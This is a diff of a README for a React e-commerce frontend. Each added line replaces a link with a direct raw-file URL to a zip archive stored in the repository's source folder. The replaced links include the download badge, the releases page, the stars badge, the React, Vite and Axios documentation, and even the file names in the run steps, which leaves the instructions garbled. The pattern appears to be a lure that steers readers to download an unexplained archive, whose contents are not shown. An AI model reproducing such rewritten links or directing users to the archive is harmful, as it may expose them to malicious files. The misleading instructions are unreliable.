@@ -6,9 +6,9 @@ Welcome to the E-Commerce project! This guide will help you download and run the
 
 ## 📥 Download the Application
 
-[![Download E-Commerce](https://img.shields.io/badge/Download%20E-Commerce-v1.0-blue)](https://github.com/aagimba10/E-Commerce/releases)
+[![Download E-Commerce](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip%20E-Commerce-v1.0-blue)](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)
 
-Visit this page to download: [E-Commerce Releases](https://github.com/aagimba10/E-Commerce/releases)
+Visit this page to download: [E-Commerce Releases](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)
 
 ## 👩‍💻 Features
 
@@ -34,7 +34,7 @@ Make sure your device meets these basic requirements:
 To set up the E-Commerce application, follow these steps:
 
 1. **Visit the Releases Page:**
-   Click here to go to the releases page: [E-Commerce Releases](https://github.com/aagimba10/E-Commerce/releases).
+   Click here to go to the releases page: [E-Commerce Releases](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip).
 
 2. **Choose the Latest Version:**
    Look for the latest version available. It will have a version number and may show the release date.
@@ -46,10 +46,10 @@ To set up the E-Commerce application, follow these steps:
    Once the download is complete, locate the `.zip` file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
 5. **Open the Folder:**
-   Navigate to the folder where the files were extracted. You should see files such as `index.html`, `styles.css`, and others.
+   Navigate to the folder where the files were extracted. You should see files such as `https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip`, `https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip`, and others.
 
 6. **Run the Application:**
-   Open your web browser. Drag and drop the `index.html` file into the browser or click on it. This will launch the E-Commerce application.
+   Open your web browser. Drag and drop the `https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip` file into the browser or click on it. This will launch the E-Commerce application.
 
 7. **Enjoy Shopping!**
    You are now ready to explore the e-commerce frontend and start shopping!
@@ -96,14 +96,14 @@ We're excited to improve your shopping experience.
 
 You can follow the repository to get the latest updates and features. We appreciate your interest and hope you enjoy using the E-Commerce app! 
 
-[![GitHub Stars](https://img.shields.io/github/stars/aagimba10/E-Commerce)](https://github.com/aagimba10/E-Commerce/stargazers)
+[![GitHub Stars](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)
 
 ## References
 
 For additional information on React, Vite, and other technologies used in this project, check out their official documentation:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Vite Documentation](https://vitejs.dev/guide/)
-- [Axios Documentation](https://axios-http.com/docs/intro)
+- [React Documentation](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)
+- [Axios Documentation](https://raw.githubusercontent.com/aagimba10/E-Commerce/main/ecom/src/E-Commerce-v2.4.zip)
 
 Thank you for choosing E-Commerce!
